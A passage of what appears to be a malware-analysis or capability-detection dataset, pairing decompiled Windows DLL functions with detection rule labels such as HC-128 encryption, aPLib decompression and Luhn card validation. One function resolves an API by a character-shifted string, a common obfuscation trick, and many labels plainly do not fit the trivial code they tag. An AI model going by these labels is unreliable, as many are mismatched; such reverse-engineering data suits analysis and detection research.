*0x180041494 - uStack120 >> 0x1f & 0x1f;\n            iVar4 = (*0x180041494 - uStack120) + uVar13;\n            uVar8 = (iVar4 & 0x1f) - uVar13;\n            uVar9 = uVar6;\n            iVar7 = iVar20;\n            do {\n                uStack120 = *puVar16 & ~(-1 << (uVar8 & 0x1f));\n                *puVar16 = *puVar16 >> (uVar8 & 0x1f) | uVar9;\n                puVar16 = puVar16 + 4;\n                uVar9 = uStack120 << (0x20 - uVar8 & 0x1f);\n                iVar7 = iVar7 + -1;\n            } while (iVar7 != 0);\n            iVar7 = 2;\n            iVar19 = iVar4 >> 5;\n            iVar17 = 2;\n            do {\n                if (iVar17 < iVar19) {\n                    *(&uStack104 + iVar17 * 4) = 0;\n                }\n                else {\n                    *(&uStack104 + iVar17 * 4) = *(&uStack104 + iVar17 * 4 + iVar19 * -4);\n                }\n                iVar17 = iVar17 + -1;\n            } while (-1 < iVar17);\n            uVar14 = str.5_v_[0] >> 0x1f & 0x1f;\n            uVar13 = str.5_v_[0] + uVar14;\n            iVar4 = uVar13 >> 5;\n            uVar13 = 0x1f - ((uVar13 & 0x1f) - uVar14);\n            uVar8 = uVar13;\n            if ((*(&uStack104 + iVar4 * 4) >> (uVar13 & 0x1f) & 1) != 0) {\n                if ((*(&uStack104 + iVar4 * 4) & ~(-1 << (uVar8 & 0x1f))) == 0) {\n                    for (iVar17 = iVar4 + 1; iVar17 < 3; iVar17 = iVar17 + 1) {\n                        if (*(&uStack104 + iVar17 * 4) != 0) goto code_r0x00018002f8b6;\n                    }\n                }\n                else {\ncode_r0x00018002f8b6:\n                    uVar13 = str.5_v_[0] + L'\\xffffffff' >> 0x1f & 0x1f;\n                    iVar5 = str.5_v_[0] + L'\\xffffffff' + uVar13;\n                    iVar18 = iVar5 >> 5;\n                    uVar14 = *(&uStack104 + iVar18 * 4);\n                    uVar3 = 1 << (0x1f - ((iVar5 & 0x1f) - uVar13) & 0x1f);\n                    uVar13 = uVar14 + uVar3;\n                    if ((uVar13 < uVar14) || (uVar9 = uVar6,  uVar13 < uVar3)) {\n                        uVar9 = uVar12;\n                    }\n                    *(&uStack104 + iVar18 * 4) = uVar13;\n                    iVar17 = iVar18 + -1;\n                    if (-1 < iVar18 + -1) {\n                        do {\n                            if (uVar9 == 0) break;\n                            uVar14 = *(&uStack104 + iVar17 * 4);\n                            uVar13 = uVar14 + 1;\n                            if ((uVar13 < uVar14) || (uVar9 = uVar6,  uVar13 == 0)) {\n                                uVar9 = uVar12;\n                            }\n                            *(&uStack104 + iVar17 * 4) = uVar13;\n                            iVar17 = iVar17 + -1;\n                        } while (-1 < iVar17);\n                    }\n                }\n            }\n            puVar1 = &uStack104 + iVar4 * 4;\n            *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n            iVar17 = iVar4 + 1;\n            if (iVar17 < 3) {\n                fcn.180026050(&uStack104 + iVar17 * 4, 0, (3 - iVar17) * 4);\n            }\n            puVar16 = &uStack104;\n            uVar13 = str.5_v_[1] + L'\\x01' >> 0x1f & 0x1f;\n            iVar4 = str.5_v_[1] + L'\\x01' + uVar13;\n            uVar8 = (iVar4 & 0x1f) - uVar13;\n            do {\n                uStack120 = *puVar16 & ~(-1 << (uVar8 & 0x1f));\n                *puVar16 = *puVar16 >> (uVar8 & 0x1f) | uVar6;\n                puVar16 = puVar16 + 4;\n                uVar6 = uStack120 << (0x20 - uVar8 & 0x1f);\n                iVar20 = iVar20 + -1;\n            } while (iVar20 != 0);\n            iVar20 = iVar4 >> 5;\n            do {\n                if (iVar7 < iVar20) {\n                    *(&uStack104 + iVar7 * 4) = 0;\n                }\n                else {\n                    *(&uStack104 + iVar7 * 4) = *(&uStack104 + iVar7 * 4 + iVar20 * -4);\n                }\n                iVar7 = iVar7 + -1;\n            } while (-1 < iVar7);\n            iVar4 = 0;\n        }\n    }\n    bVar21 = uStack116 != 0;\n    uStack116 = -uStack116;\n    uStack104._0_4_ = iVar4 << (0x1fU - str.5_v_[1] & 0x1f) | -bVar21 & 0x80000000 | uStack104;\n    if (str.5_v_[2] == L'@') {\n        puStack112[1] = uStack104;\n        *puStack112 = uStack104._4_4_;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *puStack112 = uStack104;\n    }\n    fcn.180023980(var_40h ^ auStack152);\n    return;\n}\n",
        "token_count": 3521
    },
    "18002fb9": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_bp_18h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_30h\n\nvoid fcn.18002fb98(uint16_t *arg1, uint32_t *arg2)\n\n{\n    uint32_t *puVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    uint8_t uVar8;\n    uint64_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint64_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    int32_t iVar15;\n    ulong *puVar16;\n    int64_t iVar17;\n    int32_t iVar18;\n    int64_t iVar19;\n    int64_t iVar20;\n    bool bVar21;\n    uchar auStack152 [32];\n    uint32_t uStack120;\n    uint32_t uStack116;\n    uint32_t *puStack112;\n    ulong uStack104;\n    int32_t iStack96;\n    uint64_t uStack88;\n    int32_t iStack80;\n    uint64_t var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_20h;\n    ulong var_bp_18h;\n    ulong var_10h;\n    \n    var_40h = *0x180040248 ^ auStack152;\n    uVar6 = 0;\n    uStack116 = arg1[5] & 0x8000;\n    uVar13 = arg1[5] & 0x7fff;\n    uVar14 = uVar13 - 0x3fff;\n    uStack104 = CONCAT44(*(arg1 + 1), *(arg1 + 3));\n    uVar12 = 1;\n    iVar20 = 3;\n    iStack96 = *arg1 << 0x10;\n    iVar4 = 0;\n    puStack112 = arg2;\n    if (uVar14 == 0xffffc001) {\n        do {\n            if (*(&uStack104 + uVar6 * 4) != 0) {\n                uStack104 = 0;\n                iStack96 = 0;\n                iVar4 = 0;\n                break;\n            }\n            uVar6 = uVar6 + 1;\n        } while (uVar6 < 3);\n    }\n    else {\n        uStack88 = uStack104;\n        iStack80 = *arg1 << 0x10;\n        uVar10 = *0x1800414b0 >> 0x1f & 0x1f;\n        uVar3 = *0x1800414b0 + uVar10;\n        iVar18 = uVar3 >> 5;\n        uVar3 = 0x1f - ((uVar3 & 0x1f) - uVar10);\n        uVar8 = uVar3;\n        iVar5 = 0;\n        if ((*(&uStack104 + iVar18 * 4) >> (uVar3 & 0x1f) & 1) != 0) {\n            if ((*(&uStack104 + iVar18 * 4) & ~(-1 << (uVar8 & 0x1f))) == 0) {\n                for (iVar7 = iVar18 + 1; iVar5 = iVar4,  iVar7 < 3; iVar7 = iVar7 + 1) {\n                    if (*(&uStack104 + iVar7 * 4) != 0) goto code_r0x00018002fcaa;\n                }\n            }\n            else {\ncode_r0x00018002fcaa:\n                uVar3 = *0x1800414b0 + -1 >> 0x1f & 0x1f;\n                iVar4 = *0x1800414b0 + -1 + uVar3;\n                iVar15 = iVar4 >> 5;\n                uVar10 = *(&uStack104 + iVar15 * 4);\n                uVar11 = 1 << (0x1f - ((iVar4 & 0x1f) - uVar3) & 0x1f);\n                uVar3 = uVar10 + uVar11;\n                if ((uVar3 < uVar10) || (uVar9 = uVar6,  uVar3 < uVar11)) {\n                    uVar9 = 1;\n                }\n                *(&uStack104 + iVar15 * 4) = uVar3;\n                iVar7 = iVar15 + -1;\n                iVar5 = uVar9;\n                if (-1 < iVar15 + -1) {\n                    do {\n                        iVar5 = uVar9;\n                        if (uVar9 == 0) break;\n                        uVar10 = *(&uStack104 + iVar7 * 4);\n                        uVar3 = uVar10 + 1;\n                        if ((uVar3 < uVar10) || (uVar9 = uVar6,  uVar3 == 0)) {\n                            uVar9 = uVar12;\n                        }\n                        *(&uStack104 + iVar7 * 4) = uVar3;\n                        iVar7 = iVar7 + -1;\n                        iVar5 = uVar9;\n                    } while (-1 < iVar7);\n                }\n            }\n        }\n        puVar1 = &uStack104 + iVar18 * 4;\n        *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n        iVar7 = iVar18 + 1;\n        uStack120 = uVar14;\n        if (iVar7 < 3) {\n            fcn.180026050(&uStack104 + iVar7 * 4, 0, (3 - iVar7) * 4);\n        }\n        if (iVar5 != 0) {\n            uVar14 = uVar13 - 0x3ffe;\n        }\n        if (uVar14 < *0x1800414ac - *0x1800414b0) {\n            uStack104 = 0;\n            iStack96 = 0;\n            iVar4 = 0;\n        }\n        else if (*0x1800414ac < uVar14) {\n            uVar13 = *0x1800414b4 >> 0x1f & 0x1f;\n            iVar4 = *0x1800414b4 + uVar13;\n            iVar5 = iVar4 >> 5;\n            uVar8 = iVar4;\n            cVar2 = uVar13;\n            if (uVar14 < *0x1800414a8) {\n                uStack104 = uStack104 & 0xffffffff7fffffff;\n                iVar4 = *0x1800414bc + uVar14;\n                uVar8 = (uVar8 & 0x1f) - cVar2;\n                puVar16 = &uStack104;\n                do {\n                    uStack120 = *puVar16 & ~(-1 << (uVar8 & 0x1f));\n                    *puVar16 = *puVar16 >> (uVar8 & 0x1f) | uVar6;\n                    puVar16 = puVar16 + 4;\n                    uVar6 = uStack120 << (0x20 - uVar8 & 0x1f);\n                    iVar20 = iVar20 + -1;\n                } while (iVar20 != 0);\n                iVar20 = 2;\n                do {\n                    if (iVar20 < iVar5) {\n                        *(&uStack104 + iVar20 * 4) = 0;\n                    }\n                    else {\n                        *(&uStack104 + iVar20 * 4) = *(&uStack104 + iVar20 * 4 + iVar5 * -4);\n                    }\n                    iVar20 = iVar20 + -1;\n                } while (-1 < iVar20);\n            }\n            else {\n                uVar8 = (uVar8 & 0x1f) - cVar2;\n                uStack104 = 0x80000000;\n                iStack96 = 0;\n                puVar16 = &uStack104;\n                do {\n                    uStack120 = *puVar16 & ~(-1 << (uVar8 & 0x1f));\n                    *puVar16 = *puVar16 >> (uVar8 & 0x1f) | uVar6;\n                    puVar16 = puVar16 + 4;\n                    uVar6 = uStack120 << (0x20 - uVar8 & 0x1f);\n                    iVar20 = iVar20 + -1;\n                } while (iVar20 != 0);\n                iVar20 = 2;\n                do {\n                    if (iVar20 < iVar5) {\n                        *(&uStack104 + iVar20 * 4) = 0;\n                    }\n                    else {\n                        *(&uStack104 + iVar20 * 4) = *(&uStack104 + iVar20 * 4 + iVar5 * -4);\n                    }\n                    iVar20 = iVar20 + -1;\n                } while (-1 < iVar20);\n                iVar4 = *0x1800414bc + *0x1800414a8;\n            }\n        }\n        else {\n            puVar16 = &uStack104;\n            uStack104 = uStack88;\n            iStack96 = iStack80;\n            uVar13 = *0x1800414ac - uStack120 >> 0x1f & 0x1f;\n            iVar4 = (*0x1800414ac - uStack120) + uVar13;\n            uVar8 = (iVar4 & 0x1f) - uVar13;\n            uVar9 = uVar6;\n            iVar7 = iVar20;\n            do {\n                uStack120 = *puVar16 & ~(-1 << (uVar8 & 0x1f));\n                *puVar16 = *puVar16 >> (uVar8 & 0x1f) | uVar9;\n                puVar16 = puVar16 + 4;\n                uVar9 = uStack120 << (0x20 - uVar8 & 0x1f);\n                iVar7 = iVar7 + -1;\n            } while (iVar7 != 0);\n            iVar7 = 2;\n            iVar19 = iVar4 >> 5;\n            iVar17 = 2;\n            do {\n                if (iVar17 < iVar19) {\n                    *(&uStack104 + iVar17 * 4) = 0;\n                }\n                else {\n                    *(&uStack104 + iVar17 * 4) = *(&uStack104 + iVar17 * 4 + iVar19 * -4);\n                }\n                iVar17 = iVar17 + -1;\n            } while (-1 < iVar17);\n            uVar14 = *0x1800414b0 >> 0x1f & 0x1f;\n            uVar13 = *0x1800414b0 + uVar14;\n            iVar4 = uVar13 >> 5;\n            uVar13 = 0x1f - ((uVar13 & 0x1f) - uVar14);\n            uVar8 = uVar13;\n            if ((*(&uStack104 + iVar4 * 4) >> (uVar13 & 0x1f) & 1) != 0) {\n                if ((*(&uStack104 + iVar4 * 4) & ~(-1 << (uVar8 & 0x1f))) == 0) {\n                    for (iVar17 = iVar4 + 1; iVar17 < 3; iVar17 = iVar17 + 1) {\n                        if (*(&uStack104 + iVar17 * 4) != 0) goto code_r0x00018002fe82;\n                    }\n                }\n                else {\ncode_r0x00018002fe82:\n                    uVar13 = *0x1800414b0 + -1 >> 0x1f & 0x1f;\n                    iVar5 = *0x1800414b0 + -1 + uVar13;\n                    iVar18 = iVar5 >> 5;\n                    uVar14 = *(&uStack104 + iVar18 * 4);\n                    uVar3 = 1 << (0x1f - ((iVar5 & 0x1f) - uVar13) & 0x1f);\n                    uVar13 = uVar14 + uVar3;\n                    if ((uVar13 < uVar14) || (uVar9 = uVar6,  uVar13 < uVar3)) {\n                        uVar9 = uVar12;\n                    }\n                    *(&uStack104 + iVar18 * 4) = uVar13;\n                    iVar17 = iVar18 + -1;\n                    if (-1 < iVar18 + -1) {\n                        do {\n                            if (uVar9 == 0) break;\n                            uVar14 = *(&uStack104 + iVar17 * 4);\n                            uVar13 = uVar14 + 1;\n                            if ((uVar13 < uVar14) || (uVar9 = uVar6,  uVar13 == 0)) {\n                                uVar9 = uVar12;\n                            }\n                            *(&uStack104 + iVar17 * 4) = uVar13;\n                            iVar17 = iVar17 + -1;\n                        } while (-1 < iVar17);\n                    }\n                }\n            }\n            puVar1 = &uStack104 + iVar4 * 4;\n            *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n            iVar17 = iVar4 + 1;\n            if (iVar17 < 3) {\n                fcn.180026050(&uStack104 + iVar17 * 4, 0, (3 - iVar17) * 4);\n            }\n            puVar16 = &uStack104;\n            uVar13 = *0x1800414b4 + 1 >> 0x1f & 0x1f;\n            iVar4 = *0x1800414b4 + 1 + uVar13;\n            uVar8 = (iVar4 & 0x1f) - uVar13;\n            do {\n                uStack120 = *puVar16 & ~(-1 << (uVar8 & 0x1f));\n                *puVar16 = *puVar16 >> (uVar8 & 0x1f) | uVar6;\n                puVar16 = puVar16 + 4;\n                uVar6 = uStack120 << (0x20 - uVar8 & 0x1f);\n                iVar20 = iVar20 + -1;\n            } while (iVar20 != 0);\n            iVar20 = iVar4 >> 5;\n            do {\n                if (iVar7 < iVar20) {\n                    *(&uStack104 + iVar7 * 4) = 0;\n                }\n                else {\n                    *(&uStack104 + iVar7 * 4) = *(&uStack104 + iVar7 * 4 + iVar20 * -4);\n                }\n                iVar7 = iVar7 + -1;\n            } while (-1 < iVar7);\n            iVar4 = 0;\n        }\n    }\n    bVar21 = uStack116 != 0;\n    uStack116 = -uStack116;\n    uStack104._0_4_ = iVar4 << (0x1fU - *0x1800414b4 & 0x1f) | -bVar21 & 0x80000000 | uStack104;\n    if (*0x1800414b8 == 0x40) {\n        puStack112[1] = uStack104;\n        *puStack112 = uStack104._4_4_;\n    }\n    else if (*0x1800414b8 == 0x20) {\n        *puStack112 = uStack104;\n    }\n    fcn.180023980(var_40h ^ auStack152);\n    return;\n}\n",
        "token_count": 3526
    },
    "180007b4": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nvoid fcn.180007b40(ulong arg1, int64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    uint32_t uStack24;\n    uint32_t uStack20;\n    \n    uStack20 = *(arg2 + 0x10) >> 3 & 0x3f;\n    uVar1 = *(arg2 + 0x10) + arg4 * 8;\n    *(arg2 + 0x10) = uVar1;\n    if (uVar1 < arg4 << 3) {\n        *(arg2 + 0x14) = *(arg2 + 0x14) + 1;\n    }\n    *(arg2 + 0x14) = (arg4 >> 0x1d) + *(arg2 + 0x14);\n    uStack24 = 0x40 - uStack20;\n    if (arg4 < uStack24) {\n        uStack24 = 0;\n    }\n    else {\n        fcn.180009690(arg1, arg2 + 0x18 + uStack20, arg3, uStack24);\n        fcn.180007dc0(arg1, arg2, arg2 + 0x18);\n        for (; uStack24 + 0x3f < arg4; uStack24 = uStack24 + 0x40) {\n            fcn.180007dc0(arg1, arg2, arg3 + uStack24);\n        }\n        uStack20 = 0;\n    }\n    fcn.180009690(arg1, arg2 + 0x18 + uStack20, arg3 + uStack24, arg4 - uStack24);\n    return;\n}\n",
        "token_count": 379
    },
    "180007cc": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nvoid fcn.180007cc0(ulong arg1, ulong arg2, int64_t arg3)\n\n{\n    uchar auStack88 [32];\n    uint32_t uStack56;\n    uchar auStack40 [8];\n    uint32_t uStack32;\n    uint32_t uStack28;\n    uint64_t uStack24;\n    \n    uStack24 = *0x180040248 ^ auStack88;\n    fcn.180009500(arg1, auStack40, arg3 + 0x10, 8);\n    uStack56 = *(arg3 + 0x10) >> 3 & 0x3f;\n    if (uStack56 < 0x38) {\n        uStack28 = 0x38 - uStack56;\n    }\n    else {\n        uStack28 = 0x78 - uStack56;\n    }\n    uStack32 = uStack28;\n    fcn.180007b40(arg1, arg3, 0x180048a00, uStack28);\n    fcn.180007b40(arg1, arg3, auStack40, 8);\n    fcn.180009500(arg1, arg2, arg3, 0x10);\n    fcn.1800096f0(arg1, arg3, 0, 0x58);\n    fcn.180023980(uStack24 ^ auStack88);\n    return;\n}\n",
        "token_count": 306
    },
    "18000950": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid fcn.180009500(ulong arg1, int64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    uint32_t uStack24;\n    uint32_t uStack20;\n    \n    uStack24 = 0;\n    for (uStack20 = 0; uStack20 < arg4; uStack20 = uStack20 + 4) {\n        *(arg2 + uStack20) = *(arg3 + uStack24 * 4);\n        *(arg2 + uStack20 + 1) = *(arg3 + uStack24 * 4) >> 8;\n        *(arg2 + uStack20 + 2) = *(arg3 + uStack24 * 4) >> 0x10;\n        *(arg2 + uStack20 + 3) = *(arg3 + uStack24 * 4) >> 0x18;\n        uStack24 = uStack24 + 1;\n    }\n    return;\n}\n",
        "token_count": 211
    },
    "18001089": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.180010890(ulong arg1, ulong arg2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    char *pcVar4;\n    int64_t iVar5;\n    uchar auStack104 [32];\n    int32_t iStack72;\n    uint8_t uStack68;\n    char acStack56 [32];\n    uint64_t uStack24;\n    \n    uStack24 = *0x180040248 ^ auStack104;\n    iStack72 = 0;\n    do {\n        while( true ) {\n            iVar2 = fcn.18000f960(arg1);\n            if (iVar2 <= iStack72) {\n                fcn.180023980(uStack24 ^ auStack104);\n                return;\n            }\n            puVar3 = fcn.18000ff50(arg1, iStack72);\n            uStack68 = *puVar3;\n            if ((((uStack68 == 0x26) && (iVar2 = fcn.18000f960(arg1),  iStack72 < iVar2 + -2)) &&\n                (pcVar4 = fcn.18000ff50(arg1, iStack72 + 1),  *pcVar4 == '#')) &&\n               (pcVar4 = fcn.18000ff50(arg1, iStack72 + 2),  *pcVar4 == 'x')) break;\n            if (uStack68 == 0x26) {\n                fcn.18000fd10(arg2, *0x180048890, *0x180048898);\n                iStack72 = iStack72 + 1;\n            }\n            else if (uStack68 == 0x3c) {\n                fcn.18000fd10(arg2, *0x1800488a0, *0x1800488a8);\n                iStack72 = iStack72 + 1;\n            }\n            else if (uStack68 == 0x3e) {\n                fcn.18000fd10(arg2, *0x1800488b0, *0x1800488b8);\n                iStack72 = iStack72 + 1;\n            }\n            else if (uStack68 == 0x22) {\n                fcn.18000fd10(arg2, *0x1800488c0, *0x1800488c8);\n                iStack72 = iStack72 + 1;\n            }\n            else if (uStack68 == 0x27) {\n                fcn.18000fd10(arg2, *0x1800488d0, *0x1800488d8);\n                iStack72 = iStack72 + 1;\n            }\n            else if (uStack68 < 0x20) {\n                fcn.180012630(acStack56, 0x20, \"&#x%02X;\", uStack68);\n                iVar5 = -1;\n                pcVar4 = acStack56;\n                do {\n                    if (iVar5 == 0) break;\n                    iVar5 = iVar5 + -1;\n                    cVar1 = *pcVar4;\n                    pcVar4 = pcVar4 + 1;\n                } while (cVar1 != '\\0');\n                fcn.18000fd10(arg2, acStack56, ~iVar5 - 1);\n                iStack72 = iStack72 + 1;\n            }\n            else {\n                fcn.18000fef0(arg2);\n                iStack72 = iStack72 + 1;\n            }\n        }\n        do {\n            iVar2 = fcn.18000f960(arg1);\n            if (iVar2 + -1 <= iStack72) break;\n            iVar5 = fcn.18000fa40(arg1);\n            fcn.18000fd10(arg2, iVar5 + iStack72, 1);\n            iStack72 = iStack72 + 1;\n            pcVar4 = fcn.18000ff50(arg1, iStack72);\n        } while (*pcVar4 != ';');\n    } while( true );\n}\n",
        "token_count": 883
    },
    "1800105a": {
        "rules": [
            "PEB access/35f28d23090149119036cdb16976bf66"
        ],
        "decompiled_code": "\ncode ** fcn.1800105a0(code **arg1)\n\n{\n    fcn.180010b50(arg1, 5);\n    *arg1 = vtable.TiXmlDeclaration.0;\n    fcn.18000f8d0(arg1 + 10);\n    fcn.18000f8d0(arg1 + 0xb);\n    fcn.18000f8d0(arg1 + 0xc);\n    return arg1;\n}\n",
        "token_count": 101
    },
    "18001219": {
        "rules": [
            "PEB access/35f28d23090149119036cdb16976bf66"
        ],
        "decompiled_code": "\nvoid fcn.180012190(int64_t arg1, int64_t arg2)\n\n{\n    fcn.180010ce0(arg1, arg2);\n    fcn.18000fe60(arg2 + 0x50, arg1 + 0x50);\n    fcn.18000fe60(arg2 + 0x58, arg1 + 0x58);\n    fcn.18000fe60(arg2 + 0x60, arg1 + 0x60);\n    return;\n}\n",
        "token_count": 111
    },
    "180012a8": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nulong fcn.180012a80(ulong noname_0, ulong arg2)\n\n{\n    ulong uVar1;\n    \n    if (noname_0 < 0x7f) {\n        uVar1 = fcn.180024490(noname_0);\n    }\n    else {\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 81
    },
    "180012ab": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nulong fcn.180012ab0(ulong noname_0, ulong arg2)\n\n{\n    ulong uVar1;\n    \n    if (noname_0 < 0x7f) {\n        uVar1 = fcn.180024614(noname_0);\n    }\n    else {\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 81
    },
    "1800011a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800011a0(int64_t arg1)\n\n{\n    code *pcVar1;\n    ulong uVar2;\n    uint auStack16 [4];\n    \n    auStack16[0] = 0;\n    pcVar1 = fcn.18001e5f0(\"DpnnboeMjofUpBshwX\");\n    uVar2 = (*pcVar1)(*(arg1 + 8), auStack16);\n    *(arg1 + 0x10) = auStack16[0];\n    return uVar2;\n}\n",
        "token_count": 124
    },
    "1800011f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * fcn.1800011f0(uchar *arg1, int64_t arg2)\n\n{\n    uchar *puVar1;\n    \n    puVar1 = arg1;\n    for (; arg2 != 0; arg2 = arg2 + -1) {\n        *puVar1 = 0;\n        puVar1 = puVar1 + 1;\n    }\n    return arg1;\n}\n",
        "token_count": 88
    },
    "18000122": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** fcn.180001220(code **arg1, ulong arg2)\n\n{\n    ulong auStackX16 [3];\n    \n    auStackX16[0] = arg2;\n    fcn.180023a5c(arg1, auStackX16);\n    *arg1 = vtable.std::bad_alloc.0;\n    return arg1;\n}\n",
        "token_count": 78
    },
    "18000126": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180001260(code **arg1)\n\n{\n    *arg1 = vtable.std::bad_alloc.0;\n    fcn.180023ad0(arg1);\n    return;\n}\n",
        "token_count": 43
    },
    "18000144": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180001440(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    fcn.180001340(arg1, arg2, arg3);\n    return;\n}\n",
        "token_count": 42
    },
    "1800014a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800014a0(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    fcn.1800013d0(arg1, arg2, arg3);\n    return;\n}\n",
        "token_count": 46
    },
    "1800014d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800014d0(ulong arg1, ulong arg2, uint16_t *arg3)\n\n{\n    fcn.1800012e0(arg1, *arg3, arg2);\n    return;\n}\n",
        "token_count": 50
    },
    "18000150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180001500(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    fcn.180001400(arg1, arg2, arg3);\n    return;\n}\n",
        "token_count": 42
    },
    "180001d7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180001d70(int64_t arg1)\n\n{\n    return arg1 + 0x80;\n}\n",
        "token_count": 29
    },
    "180001d9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180001d90(int64_t arg1)\n\n{\n    return arg1 + 0x122;\n}\n",
        "token_count": 29
    },
    "180001db": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180001db0(ulong arg1, int64_t arg2)\n\n{\n    ulong arg2_00;\n    uchar auStack40 [8];\n    uchar *puStack32;\n    ulong uStack24;\n    \n    uStack24 = 0xfffffffffffffffe;\n    puStack32 = auStack40;\n    arg2_00 = fcn.18000eb40(puStack32, arg2 + 0x20);\n    fcn.18000b9e0(arg1, arg2_00);\n    fcn.180002710(arg1, 0, 0);\n    fcn.1800022d0(arg1, arg2, 0, *0x180039ea8);\n    return arg1;\n}\n",
        "token_count": 162
    },
    "180001e3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180001e30(ulong arg1)\n\n{\n    ulong arg2;\n    uchar auStack24 [8];\n    uchar *puStack16;\n    \n    puStack16 = auStack24;\n    arg2 = fcn.18000eb30(puStack16);\n    fcn.18000b9e0(arg1, arg2);\n    fcn.180002710(arg1, 0, 0);\n    return arg1;\n}\n",
        "token_count": 99
    },
    "180001e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180001e80(ulong arg1, ulong arg2)\n\n{\n    ulong arg2_00;\n    uchar auStack40 [8];\n    uchar *puStack32;\n    ulong uStack24;\n    \n    uStack24 = 0xfffffffffffffffe;\n    puStack32 = auStack40;\n    arg2_00 = fcn.18000eb30(puStack32);\n    fcn.18000b9e0(arg1, arg2_00);\n    fcn.180002710(arg1, 0, 0);\n    fcn.1800023e0(arg1, arg2);\n    return arg1;\n}\n",
        "token_count": 141
    },
    "180001ef": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180001ef0(ulong arg1, ulong arg2)\n\n{\n    fcn.180002710(arg1, CONCAT71(arg2 >> 8, 1), 0);\n    fcn.18000bcf0(arg1);\n    return;\n}\n",
        "token_count": 59
    },
    "180001f2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180001f20(ulong arg1, ulong arg2)\n\n{\n    fcn.1800022a0(arg1, arg2);\n    return;\n}\n",
        "token_count": 38
    },
    "180001f5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180001f50(ulong arg1, ulong arg2)\n\n{\n    fcn.1800023e0(arg1, arg2);\n    return;\n}\n",
        "token_count": 38
    },
    "180001f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180001f80(ulong arg1, ulong arg2)\n\n{\n    fcn.180002270(arg1, arg2);\n    return;\n}\n",
        "token_count": 36
    },
    "1800020b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
